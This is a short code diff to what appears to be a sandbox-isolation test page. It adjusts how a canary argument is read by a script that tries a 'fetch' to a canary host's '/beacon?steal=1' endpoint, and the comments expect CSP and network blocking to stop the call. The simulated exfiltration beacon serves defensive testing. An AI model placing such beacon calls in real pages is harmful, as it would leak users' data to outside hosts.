@@ -5,7 +5,7 @@
      Blocked by CSP connect-src 'none' (renderer) and, if that were removed, by
      the request canceller + dead proxy (network). Canary must stay silent. -->
 <script>
-  const canary = (window.bridge.getArgs() || {}).canary || {};
+  const canary = ((window.bridge.getArgs() || {}).args || {}).canary || {};
   (async () => {
     const r = { attack: 'fetch' };
     try { await fetch(canary.http + '/beacon?steal=1'); r.httpResolved = true; }
